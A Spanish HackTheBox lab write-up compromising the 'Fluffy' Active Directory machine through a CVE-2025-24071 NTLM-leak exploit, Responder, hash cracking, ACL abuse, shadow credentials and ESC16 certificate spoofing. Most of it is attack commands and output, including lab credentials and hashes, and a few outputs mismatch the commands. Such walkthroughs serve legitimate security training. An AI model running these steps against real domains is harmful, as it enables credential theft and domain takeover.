---
title: "HTB: Fluffy"
date: 2026-04-12 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, ADCS, ESC16, ShadowCredentials, NTLM, CVE-2025-24071]
image:
  path: /assets/img/Fluffy-HTB.png
  alt: HackTheBox Fluffy Machine
  width: 500
  height: 280
  class: sz-contain
---

## Introducción

**Fluffy** es una máquina de dificultad **Fácil** en **HackTheBox**, enfocada en entornos de
**Active Directory**. El vector de acceso inicial se obtiene mediante la explotación del
**CVE-2025-24071**, una vulnerabilidad en **Windows Explorer** que permite la divulgación de
hashes **NTLM** a través de archivos `.library-ms` maliciosos. Una vez obtenidas las
credenciales del usuario `p.agila`, se realiza una enumeración del dominio con **BloodHound**,
identificando una cadena de abuso de **ACLs** que permite añadir usuarios a grupos privilegiados.
Aprovechando el permiso **GenericWrite** sobre cuentas de servicio, se aplican técnicas de
**Shadow Credentials** para obtener acceso como `winrm_svc` y posteriormente como `ca_svc`.
Finalmente, se explota una mala configuración en **Active Directory Certificate Services (ADCS)**
conocida como **ESC16**, que permite suplantar al usuario `Administrator` mediante la manipulación
del atributo **UPN**, obteniendo así control total del dominio.

---

## Reconocimiento

### Comprobación de conectividad

Se enviará una solicitud de **ICMP** (`ping`) para comprobar que la máquina objetivo se
encuentra activa y accesible.

```bash
ping -c 1 10.129.17.155
```

```
64 bytes from 10.129.17.155: icmp_seq=1 ttl=127 time=94.3 ms
```

### Escaneo de Puertos

Se ejecutará un escaneo de puertos con **Rustscan** para identificar los servicios expuestos
en la máquina objetivo.

```bash
rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
```

**Resultados relevantes:**

| Puerto  | Estado | Servicio                  |
|---------|--------|---------------------------|
| 53      | open   | Simple DNS Plus           |
| 88      | open   | Kerberos                  |
| 139     | open   | NetBIOS                   |
| 389     | open   | LDAP (AD)                 |
| 445     | open   | SMB                       |
| 464     | open   | Kpasswd5                  |
| 593     | open   | RPC over HTTP             |
| 636     | open   | LDAPS                     |
| 3268    | open   | LDAP Global Catalog       |
| 3269    | open   | LDAPS Global Catalog      |
| 5985    | open   | WinRM (HTTP)              |
| 9389    | open   | .NET Message Framing      |

### Análisis del escaneo

Los puertos habituales de **Active Directory** se encuentran abiertos, incluyendo **DNS**,
**Kerberos**, **LDAP**, **SMB** y **WinRM**, lo que confirma que el host corresponde a un
**Controlador de Dominio** dentro del entorno `fluffy.htb`.

- **Firma SMB:** La firma obligatoria está habilitada, lo que evita ataques de retransmisión
  **NTLM**. Será necesario buscar otros vectores, como el abuso de **ADCS**.
- **Active Directory Certificate Services (ADCS):** Se detecta la presencia de una autoridad
  certificadora interna (`fluffy-DC01-CA`). Configuraciones incorrectas pueden permitir ataques
  tipo **ESC (Enterprise Security Certificate)**, habilitando escalada de privilegios en el dominio.
- **WinRM habilitado:** El puerto `5985` está abierto, lo que permite acceso remoto con
  credenciales válidas mediante **Windows Remote Management**.
- **Desfase horario:** Se detectó una diferencia significativa de hora entre el servidor y
  nuestra máquina. Este detalle es crítico para ataques **Kerberos**, que fallarán si no se
  sincroniza previamente.

---

## Enumeración inicial (NXC)

Reutilizaremos las credenciales filtradas por el creador para realizar una enumeración autenticada.

### Enumeración de usuarios

```bash
nxc smb $IP -u 'p.agila' -p 'prometheusx-303' --users
```

**Output:**

```
SMB  10.129.17.155  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.129.17.155  445  DC01  [+] fluffy.htb\p.agila:prometheusx-303
SMB  10.129.17.155  445  DC01  -Username-     -Last PW Set-        -BadPW-  -Description-
SMB  10.129.17.155  445  DC01  Administrator  2025-04-17 15:45:01  0        Built-in account for administering the computer/domain
SMB  10.129.17.155  445  DC01  Guest          <never>              0        Built-in account for guest access to the computer/domain
SMB  10.129.17.155  445  DC01  krbtgt         2025-04-17 16:00:02  0        Key Distribution Center Service Account
SMB  10.129.17.155  445  DC01  ca_svc         2025-04-17 16:07:50  0
SMB  10.129.17.155  445  DC01  ldap_svc       2025-04-17 16:17:00  0
SMB  10.129.17.155  445  DC01  p.agila        2025-04-18 14:37:08  0
SMB  10.129.17.155  445  DC01  winrm_svc      2025-05-18 00:51:16  0
SMB  10.129.17.155  445  DC01  j.coffey       2025-04-19 12:09:55  0
SMB  10.129.17.155  445  DC01  j.fleischman   2025-05-16 14:46:55  0
SMB  10.129.17.155  445  DC01  [*] Enumerated 9 local users: FLUFFY
```


### Enumeración de recursos compartidos

```bash
nxc smb $IP -u 'p.agila' -p 'prometheusx-303' --shares
```

**Output:**

```
SMB  10.129.17.155  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.129.17.155  445  DC01  [+] fluffy.htb\p.agila:prometheusx-303
SMB  10.129.17.155  445  DC01  [*] Enumerated shares
Share      Permissions     Remark
-----      -----------     ------
ADMIN$                     Remote Admin
C$                         Default share
IPC$       READ            Remote IPC
IT         READ,WRITE      
NETLOGON   READ            Logon server share
SYSVOL     READ            Logon server share
```

Los resultados muestran los recursos predeterminados de **Active Directory** (`ADMIN$`, `C$`,
`IPC$`, `NETLOGON` y `SYSVOL`), además de un recurso no estándar llamado **IT** que merece
mayor atención.

### Enumeración del recurso compartido IT

```bash
nxc smb $IP -u 'p.agila' -p 'prometheusx-303' --share IT -M spider_plus -o SHARE=IT
```

**Output:**

```
SMB  10.129.17.155  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.129.17.155  445  DC01  [+] fluffy.htb\p.agila:prometheusx-303
SPIDER_PLUS 10.129.17.155 445 DC01 [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.17.155 445 DC01 [*] DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.17.155 445 DC01 [*] STATS_FLAG: True
SPIDER_PLUS 10.129.17.155 445 DC01 [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.17.155 445 DC01 [*] EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.17.155 445 DC01 [*] MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.17.155 445 DC01 [*] OUTPUT_FOLDER: /home/lexo/.nxc/modules/nxc_spider_plus
SMB  10.129.17.155  445  DC01  [*] Enumerated shares
Share      Permissions     Remark
-----      -----------     ------
ADMIN$                     Remote Admin
C$                         Default share
IPC$       READ            Remote IPC
IT         READ,WRITE      
NETLOGON   READ            Logon server share
SYSVOL     READ            Logon server share
SPIDER_PLUS 10.129.17.155 445 DC01 [+] Saved share-file metadata to "/home/lexo/.nxc/modules/nxc_spider_plus/10.129.17.155.json".
SPIDER_PLUS 10.129.17.155 445 DC01 [*] SMB Shares:           6 (ADMIN$, C$, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.17.155 445 DC01 [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.17.155 445 DC01 [*] SMB Writable Shares:  1 (IT)
SPIDER_PLUS 10.129.17.155 445 DC01 [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.17.155 445 DC01 [*] Total folders found:  27
SPIDER_PLUS 10.129.17.155 445 DC01 [*] Total files found:    26
SPIDER_PLUS 10.129.17.155 445 DC01 [*] File size average:    545.57 KB
SPIDER_PLUS 10.129.17.155 445 DC01 [*] File size min:        23 B
SPIDER_PLUS 10.129.17.155 445 DC01 [*] File size max:        3.15 MB
```
Observamos el recurso compartido.

```bash
cat "/home/lexo/.nxc/modules/nxc_spider_plus/10.129.17.155.json"
```

**Archivos relevantes encontrados:**

```json
{
    "IT": {
        "Everything-1.4.1.1026.x64.zip": { "size": "1.74 MB" },
        "KeePass-2.58.zip": { "size": "3.08 MB" },
        "Upgrade_Notice.pdf": { "size": "165.98 KB" }
    }
}
```

> El archivo `Upgrade_Notice.pdf` resulta especialmente interesante. Procedemos a descargarlo.

```bash
nxc smb $IP -u 'p.agila' -p 'prometheusx-303' --share IT --get-file 'Upgrade_Notice.pdf' './Upgrade_Notice.pdf'
```

**Ouput:**

```
SMB  10.129.17.155  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.129.17.155  445  DC01  [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB  10.129.17.155  445  DC01  [*] Copying "Upgrade_Notice.pdf" to "./Upgrade_Notice.pdf"
SMB  10.129.17.155  445  DC01  [+] File "Upgrade_Notice.pdf" was downloaded to "./Upgrade_Notice.pdf"
```

---

## CVE-2025-24071 — Windows Explorer NTLM Hash Disclosure

Al revisar el PDF, el departamento de IT documenta el **CVE-2025-24071**, probablemente
como aviso de un mantenimiento pendiente. Intentaremos explotarlo.

![PDF](/assets/img/fluffy/pdf.png)

**Windows Explorer** intenta conectarse automáticamente a rutas SMB cuando procesa ciertos
archivos. Un archivo `.library-ms` malicioso puede contener una ruta como
`\\IP-ATACANTE\shared`, lo que hace que el sistema intente autenticarse y exponga el **hash NTLM**.

### Explotación

Descargamos el exploit desde ExploitDB y lo ejecutamos:

![ExploitDB](/assets/img/fluffy/db-exploit.png)

```bash
python3 CVE-2025-24071.py -i 10.10.14.116 -n update_patch
```

```
[*] Generating malicious .library-ms file...
[+] Created ZIP: output/update_patch.zip
[-] Removed intermediate .library-ms file
[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.
```

Iniciamos **Responder** en segundo plano y subimos el archivo malicioso al recurso **IT**:

```bash
sudo Responder -I tun0 -v
```

```bash
nxc smb $IP -u 'p.agila' -p 'prometheusx-303' --share IT --put-file output/update_patch.zip update_patch.zip
```

**Output:**

```
SMB  10.129.17.155  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.129.17.155  445  DC01  [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB  10.129.17.155  445  DC01  [*] Copying output/update_patch.zip to update_patch.zip
SMB  10.129.17.155  445  DC01  [+] Created file output/update_patch.zip on \\IT\update_patch.zip
```

Capturamos el hash **NTLMv2** de `p.agila`:

```
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:24fb59e71aa944f8:908DB9403F...
```

Crackeamos offline con **Hashcat**:

```bash
hashcat -m 5600 pagila_hash /usr/share/wordlists/rockyou.txt
```

**Resultado:** `prometheusx-303`

---

## Análisis de Dominio - BloodHound

Recopilamos información del dominio con las credenciales obtenidas para identificar
rutas de ataque y escalada de privilegios.

```bash
bloodhound-ce-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns $IP -c All --zip
```

### Abuso de ACL: GenericAll sobre Service Accounts

BloodHound revela que `p.agila` es miembro del grupo **Service Account**, y este grupo
tiene el permiso `GenericAll` sobre el grupo **Service Accounts**.

![GenericAll](/assets/img/fluffy/genericall.png)

Esto nos permite añadir a `p.agila` directamente al grupo **Service Accounts** y
posteriormente realizar **Shadow Credentials** sobre cualquiera de las cuentas de servicio
(`CA_SVC`, `LDAP_SVC`, `WINRM_SVC`).

![Shadow Path](/assets/img/fluffy/genericwrite.png)

#### Añadir usuario al grupo Service Accounts

```bash
bloodyAD --host $IP -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' add GroupMember "SERVICE ACCOUNTS" "p.agila"
```

```
[+] p.agila added to SERVICE ACCOUNTS
```

---

## Acceso Inicial: Shadow Credentials sobre WINRM_SVC

```bash
bloodyAD --host $IP -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' add shadowCredentials winrm_svc
```

```
[+] KeyCredential generated with sha256: 541f3083fed69f161ab1ef2b7a4a63ac7cf949f1c9a489de3f9527d4067cef9f
[+] TGT stored in ccache file winrm_svc_6C.ccache
NT: 33bd09dcd697600edf6b3a7af4875767
```

Accedemos con **Evil-WinRM** usando Pass-The-Hash:

```bash
evil-winrm -i $IP -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
```

### Flag de usuario

```powershell
*Evil-WinRM* PS C:\Users\winrm_svc> type Desktop\user.txt
019b99194676f8d62a72d19c63cf6092
```

---

## Escalada de Privilegios

Recordemos que el escaneo inicial detectó la CA interna `fluffy-DC01-CA`. El siguiente
objetivo es comprometer la cuenta `ca_svc` para abusar de **ADCS**.

### Shadow Credentials sobre CA_SVC

```bash
bloodyAD --host $IP -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' add shadowCredentials ca_svc
```

```
[+] TGT stored in ccache file ca_svc_VE.ccache
NT: ca0f4f9e9eb8a092addf53bb03fc98c8
```

### ESC16: UPN Spoofing via ADCS

Enumeramos los templates de certificado vulnerables:

```bash
certipy find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -enabled -vulnerable -stdout
```

**Resultado:**

```
[!] Vulnerabilities
  ESC16: Security Extension is disabled.
```

**ESC16** nos permite modificar el atributo `userPrincipalName (UPN)` de `ca_svc` para
suplantar a `Administrator`. Cuando la CA emite el certificado, incrusta el UPN modificado,
lo que permite autenticarse como el usuario objetivo.

#### 1. Modificar el UPN de ca_svc

```bash
certipy account update -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip $IP -user 'ca_svc' -upn 'administrator'
```

**Output:**

```
[*] Successfully updated 'ca_svc'
    userPrincipalName: Administrator@fluffy.htb
```

#### 2. Solicitar certificado

```bash
certipy req -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip $IP -ca 'fluffy-DC01-CA' -target 'DC01.fluffy.htb' -template 'User'
```

**Output:**

```
[*] Got certificate with UPN 'Administrator@fluffy.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

#### 3. Autenticarse con el certificado

```bash
certipy auth -pfx administrator.pfx -dc-ip $IP
```

**Output:**

```
[*] Got TGT
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

---

## Acceso Final como Administrador

Utilizamos el **ccache** obtenido para acceder con **psexec**:

```bash
export KRB5CCNAME=administrator.ccache

psexec.py -k -no-pass administrator@DC01.fluffy.htb
```

**Output:**

```
[*] Found writable share ADMIN$
[*] Creating service on DC01.fluffy.htb.....

Microsoft Windows [Version 10.0.17763.6893]

C:\Windows\system32>
```

### Flag de root

```powershell
C:\Windows\system32> type c:\users\administrator\desktop\root.txt
303a3db24395f5bb0760b5f6ee41c53e
```
**¡Máquina comprometida con éxito!**
